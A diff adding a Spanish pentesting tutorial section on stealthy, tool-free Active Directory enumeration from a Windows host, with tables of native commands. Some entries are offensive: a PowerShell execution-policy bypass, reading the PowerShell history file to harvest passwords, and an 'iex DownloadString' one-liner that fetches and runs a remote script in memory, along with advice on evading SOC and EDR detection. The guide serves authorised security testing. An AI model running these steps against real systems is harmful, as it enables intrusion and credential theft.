@@ -163,5 +163,32 @@ Sin embargo, en una **auditoría evasiva**, una **evaluación adversarial** o un
 Lanzar Nmap contra toda la red no es precisamente sigiloso, y muchas de las herramientas habituales de pentesting pueden generar alertas si el cliente tiene un SOC preparado o un equipo Blue con experiencia.
 Por eso, **asegúrate siempre de aclarar los objetivos y el estilo de la prueba con el cliente por escrito antes de comenzar**.
 
+## Escenario
 
+A continuación vamos a ver un escenario para AD y como enumerar todo tipo de información desde un host Windows. Supongamos que nuestro cliente nos ha pedido que probemos su entorno AD desde un equipo gestionado sin acceso a Internet, y todos los intentos de cargar herramientas en él han fracasado. El cliente quiere ver qué tipos de enumeración son posibles, así que tendremos que recurrir a “vivir del terreno” usando solo herramientas y comandos nativos de Windows/Active Directory. Esto también puede ser un enfoque más sigiloso y puede no generar tantos registros ni alertas como cuando incorporamos herramientas externas en secciones anteriores. La mayoría de los entornos empresariales actuales cuentan con algún tipo de monitorización y registro de red, incluidos IDS/IPS, cortafuegos y sensores pasivos, además de defensas en los propios hosts como Windows Defender o EDR corporativo. Dependiendo del entorno, también pueden tener sistemas que establecen una línea base de tráfico “normal” y buscan anomalías. Por ello, nuestras posibilidades de ser detectados aumentan exponencialmente cuando empezamos a introducir herramientas en el entorno desde el exterior.
+
+##### Comandos de entorno para el host y reconocimiento de red
+
+| Comando                                           | Resultado                                                                                       |
+|---------------------------------------------------|-------------------------------------------------------------------------------------------------|
+| `hostname`                                        | Imprime el nombre del equipo                                                                    |
+| `[System.Environment]::OSVersion.Version`         | Muestra la versión y nivel de revisión del sistema operativo                                    |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lista los parches y hotfixes instalados en el equipo                                             |
+| `ipconfig /all`                                   | Muestra el estado y la configuración de los adaptadores de red                                   |
+| `set`                                             | Muestra las variables de entorno de la sesión actual (ejecutado desde CMD)                      |
+| `echo %USERDOMAIN%`                               | Muestra el nombre del dominio al que pertenece el equipo (ejecutado desde CMD)                  |
+| `echo %logonserver%`                              | Imprime el nombre del controlador de dominio con el que el equipo inicia sesión (desde CMD)     |
+
+El comando `systeminfo` imprime un resumen de la información del equipo en una sola salida concisa. Ejecutar un único comando genera menos registros, reduciendo así la probabilidad de ser detectados por un defensor.
+
+##### Aprovechando PowerShell
+
+| Cmdlet                                                                                     | Descripción                                                                                                                                                                |
+| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Get-Module`                                                                               | Lista los módulos disponibles que están cargados para su uso.                                                                                                              |
+| `Get-ExecutionPolicy -List`                                                                | Muestra las políticas de ejecución configuradas para cada ámbito (scope) en el equipo.                                                                                     |
+| `Set-ExecutionPolicy Bypass -Scope Process`                                                | Cambia la política de ejecución solo para el proceso actual, revirtiéndose al cerrar o terminar el proceso. Ideal para no dejar cambios permanentes en el equipo víctima.  |
+| `Get-ChildItem Env: \| ft Key,Value`                                                       | Muestra variables de entorno, como rutas, usuarios, información del equipo, etc.                                                                                           |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Obtiene el historial de comandos de PowerShell del usuario especificado, lo cual puede revelar contraseñas o indicar archivos de configuración o scripts con credenciales. |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <comandos>"`     | Descarga y ejecuta rápidamente un script desde una URL en memoria usando PowerShell, sin guardar el archivo en disco (`-nop` = NoProfile).                                 |
 
